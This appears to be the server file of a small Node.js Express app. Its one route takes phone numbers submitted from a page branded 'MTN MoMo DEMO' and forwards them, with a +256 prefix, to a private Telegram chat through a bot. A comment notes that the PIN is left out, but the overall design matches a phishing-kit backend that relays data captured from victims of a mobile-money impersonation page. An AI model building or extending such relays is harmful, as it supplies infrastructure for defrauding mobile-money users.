const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));


app.post("/demo-submission", async (req, res) => {

  const { phone, success } = req.body;

  // Only accept a valid demo number and completion status.
  if (
    typeof phone !== "string" ||
    !/^[0-9]{9}$/.test(phone) ||
    typeof success !== "boolean"
  ) {
    return res.status(400).json({
      error: "Invalid demo submission"
    });
  }


  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;


  if (!botToken || !chatId) {

    console.error("Telegram environment variables are missing.");

    return res.status(500).json({
      error: "Telegram is not configured"
    });
  }


  // IMPORTANT:
  // The demo PIN is deliberately NOT included.
  const message =
`🧪 MTN MoMo DEMO

📱 Demo number: +256${phone}

✅ Demo completed

PIN: not transmitted`;


  try {

    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }
    );


    if (!response.ok) {

      const error = await response.text();

      console.error("Telegram error:", error);

      return res.status(500).json({
        error: "Telegram notification failed"
      });
    }


    return res.json({
      success: true
    });


  } catch (error) {

    console.error("Telegram request failed:", error);

    return res.status(500).json({
      error: "Notification failed"
    });

  }

});


app.get("*", (req, res) => {

  res.sendFile(
    path.join(__dirname, "index.html")
  );

});


app.listen(PORT, () => {

  console.log(`Server running on port ${PORT}`);

});
